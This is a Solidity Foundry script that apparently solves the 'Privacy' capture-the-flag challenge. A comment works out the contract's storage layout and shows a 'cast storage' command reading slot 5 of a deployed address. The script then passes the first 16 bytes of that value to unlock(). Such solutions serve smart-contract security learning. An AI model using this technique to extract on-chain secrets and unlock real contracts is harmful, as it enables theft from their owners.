// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {Privacy} from "src/privacy/Privacy.sol";

contract PrivacyScript is Script {
    Privacy internal privacy;

    function setUp() public virtual {
        privacy = Privacy(0x933B13eF15efA11b0EC330c7Dc9066284c2A1bc9);
    }

    function run() public virtual {
        vm.startBroadcast();
        /**
            Considering the following:
            - locked will be in storage slot 0.
            - ID will be in storage slot 1.
            - flattening, denomination, and awkwardness will be packed together in storage slot 2, because they are all small-sized types (uint8 and uint16) and can fit in a single slot (32 bytes).
            - The array data will start at storage slot 3. Since data is a statically-sized array of bytes32 elements, each element occupies one full slot.

            Therefore, data[0] is in slot 3, data[1] is in slot 4, and data[2] is in slot 5.
            ➜ cast storage 0x933B13eF15efA11b0EC330c7Dc9066284c2A1bc9 5 --rpc-url $RPC_URL
            0x9116a64b387ce93ada205ee4eba8cc5b9f511f93dbe838f62846b34ca64c0dad
        */
        console2.log(privacy.locked());
        privacy.unlock(
            bytes16(
                bytes32(
                    0x9116a64b387ce93ada205ee4eba8cc5b9f511f93dbe838f62846b34ca64c0dad
                )
            )
        );
        console2.log(privacy.locked());

        vm.stopBroadcast();
    }
}
